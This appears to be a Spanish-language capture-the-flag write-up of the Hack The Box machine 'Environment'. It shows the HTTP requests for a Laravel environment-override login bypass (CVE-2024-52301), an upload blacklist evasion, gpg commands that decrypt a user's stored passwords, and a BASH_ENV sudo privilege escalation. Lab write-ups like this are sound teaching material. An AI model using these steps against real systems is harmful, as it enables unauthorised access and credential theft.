---
layout: post
title: "Environment"
date: 2026-01-23 00:00:00 +0100
tags: ["File Upload", "CVE", "Sudoers", "GNUPG"]
os: "Linux"
level: "Medium"
image: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/757eeb9b0f530e71875f0219d0d477e4.png"
---

Enumeración de servicios.

```java
nmap -sC -sV -p22,80 -Pn 10.10.11.67              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-30 14:30 CEST
Nmap scan report for environment.htb (10.10.11.67)
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Save the Environment | environment.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.55 seconds
```

Acceder a la página web.

![](/assets/machines/environment.htb/images/4651aa13-d7fb-4d89-a30c-cfacaf9e6e20.webp)

Enumeración de directorios.

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://environment.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://environment.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

logout                  [Status: 302, Size: 358, Words: 60, Lines: 12, Duration: 201ms]
login                   [Status: 200, Size: 2391, Words: 532, Lines: 55, Duration: 208ms]
upload                  [Status: 405, Size: 244869, Words: 46159, Lines: 2576, Duration: 410ms]
mailing                 [Status: 405, Size: 244871, Words: 46159, Lines: 2576, Duration: 464ms]
up                      [Status: 200, Size: 2126, Words: 745, Lines: 51, Duration: 151ms]
storage                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 43ms]
build                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 298ms]
vendor                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 42ms]
```

Estuve probando con las URL que me había encontrado. Por ejemplo, en `/login` nos aparece...

![](/assets/machines/environment.htb/images/f86c94e6-97f3-42e9-ab36-9d7449d6cac8.webp)

Al acceder a ``/upload``, nos aparece lo siguiente. 

![](/assets/machines/environment.htb/images/0dd43ef2-d950-4a11-839c-373775c6670d.webp)

Esto nos dice que la web tiene activado el modo **debug**. Y la aplicación esta usando PHP 8.2.28 con Laravel 11.30.0.

Dado que el **debug** estaba activo, estuve lanzando peticiones a los endpoints conocidos para ver si alguno tiraba error y me permitía ver el traceback con algo de código.

Y efectivamente, la aplicación falla al procesar una petición de Login modificando el parámetro remember a cualquier otro valor que no sea `True` o `False`.

```
POST /login HTTP/1.1
Host: environment.htb
<SNIP>

_token=3MScbD3giUSOTvH2FmGMRzcAWQcuspFisKLmm7xj&email=admin%40admin.com&password=admin&remember=False1
```

Como respuesta, el servidor muestra el código que provoca el error.

![](/assets/machines/environment.htb/images/0cc61e77-d42e-48f9-b52d-db61ca45b096.webp)

El bloque de código de interés es el siguiente.

```php
if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs
	$request->session()->regenerate();
	$request->session()->put('user_id', 1);
	return redirect('/management/dashboard');
}
```

Al parecer si la variable de entorno ``APP_ENV`` es preprod, te inicia sesión automáticamente. Así que, haciendo uso del CVE-2024-52301, podemos modificar dicha variable de entorno para hacer bypass del inicio de sesión.

* [CVE-2024-52301](https://github.com/Nyamort/CVE-2024-52301): Permite a un atacante modificar la variable de entorno ``APP_ENV`` por medio de la URL.

```
POST /login?--env=preprod HTTP/1.1
Host: environment.htb
<SNIP>

_token=76tNv53T7IJeeCX0JiCHeGHD0Vu4qbCkhVlpPjaM&email=admin%40gmail.com&password=admin&remember=False
```

Una vez dentro somos el usuario Hish.

![](/assets/machines/environment.htb/images/0bbd5a00-ec66-4fa2-be33-3f084aeb472d.webp)

El dashboard no ofrece mucha funcionalidad, solo podemos llegar a cambiar la foto de perfil.

![](/assets/machines/environment.htb/images/2860b181-32fc-44e4-995f-42a86a30d0bf.webp)

La funcionalidad de upload parece implementar una blacklist, la cual valida los magic bytes y se fija en que la extensión no sea php. Sin embargo, el resto de extensiones si que nos permite subirlas.

![](/assets/machines/environment.htb/images/50cbd7aa-07e3-4ef3-a358-f3c524849341.webp)

Al intentar subir archivos con extensiones como php3 o php4 y abrirlas, solo conseguí que descargará el archivo, sin éxito de ejecución. Por algún motivo, al utilizar un `.` al final del nombre del fichero, el sistema elimina el punto, haciendo bypass de la blacklist.

![](/assets/machines/environment.htb/images/bc25e951-8fea-4d04-b05f-18f334be3782.webp)

Ejecutamos una reverse shell y seremos el usuario `www-data`. Aún así podemos llegar a obtener el user.txt que se encuentra en `/home/hish`.

Podemos ver que existe el directorio ``.gnupg`` y el fichero ``backup/keyvault.gpg``.

![](/assets/machines/environment.htb/images/2cde105c-ca82-4582-bf5d-bde919950937.webp)

Entonces podemos extraer la información cifrada de `.gnupg` con la clave privada `keyvault.gpg`.

```
$ cp -r /home/hish/.gnupg /tmp/gnupg
$ chmod -R 700 /tmp/gnupg
$ gpg --homedir /tmp/gnupg --list-secret-keys
$ gpg --homedir /tmp/gnupg --output /tmp/message.txt --decrypt /home/hish/backup/keyvault.gpg
```

```
bash-5.2$ cat message.txt
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

La contraseña correcta del usuario ``hish`` para SSH es `marineSPm@ster!!`.

Al ejecutar el comando ``sudo -l`` para ver los permisos especiales, vemos que podemos ejecutar el comando ``/usr/bin/systeminfo`` como root, además vemos que podemos darle valor a la variable de entorno ``BASH_ENV``.

![](/assets/machines/environment.htb/images/38637432-0d64-41ef-bf78-44922a08dbe3.webp)

La variable ``BASH_ENV`` nos permite lanzar un ejecutable antes del ``/usr/bin/systeminfo``, teniendo este ejecutable permisos de root. Por lo que, procedemos a crear un ejecutable que nos permita escalar privilegios `root.sh`.

![](/assets/machines/environment.htb/images/efa86377-3a43-4733-a98b-212df37bf291.webp)

El ejecutable `root.sh` da permisos de SUID a `/bin/bash` por lo que ahora el comando `/bin/bash -p` nos daría una shell con root.

![](/assets/machines/environment.htb/images/54000ba5-0751-4bda-bb61-49d1feae926f.webp)

¡Happy  Hacking!